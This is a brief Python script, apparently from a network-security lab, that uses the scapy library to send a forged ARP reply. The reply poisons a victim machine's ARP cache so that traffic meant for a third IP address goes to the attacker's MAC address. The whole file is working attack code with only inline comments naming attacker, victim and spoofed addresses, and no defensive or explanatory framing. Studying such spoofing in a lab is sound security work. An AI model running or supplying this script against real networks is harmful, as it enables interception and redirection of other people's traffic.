from scapy.all import Ether, ARP, sendp

macAttacker = "08:00:27:d0:25:4b" # MAC address of the attacker's machine
ipAttacker = "192.168.56.103" # IP address of the attacker's machine

macVictim = "08:00:27:b7:c4:af" # MAC address of the victim's machine
ipVictim = "192.168.56.101" # IP address of the victim's machine

ipToSpoof = "192.168.56.102" # IP address of the target machine (the one we want to spoof)

arp= Ether() / ARP()
arp[Ether].src = macAttacker
arp[ARP].hwsrc = macAttacker
arp[ARP].psrc = ipToSpoof
arp[ARP].hwdst = macVictim
arp[ARP].pdst = ipVictim

sendp(arp, iface="enp0s3")